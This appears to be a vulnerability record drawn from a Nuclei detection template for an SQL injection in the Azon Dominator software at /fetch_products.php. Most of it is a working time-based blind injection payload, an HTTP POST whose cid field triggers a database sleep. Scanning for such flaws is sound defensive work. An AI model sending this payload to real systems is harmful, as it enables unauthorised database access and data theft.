# Vulnerability: Azon Dominator - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`azon-dominator-sqli.yaml`)

## Description
Azon Dominator software is vulnerable to a sql attack at /fetch_products.php.

## Vulnerable Code Pattern / Exploit Payload
```http
@timeout 20s
POST /fetch_products.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

cid=1*if(now()=sysdate()%2Csleep(6)%2C0)&max_price=124&minimum_range=0&sort=112
```

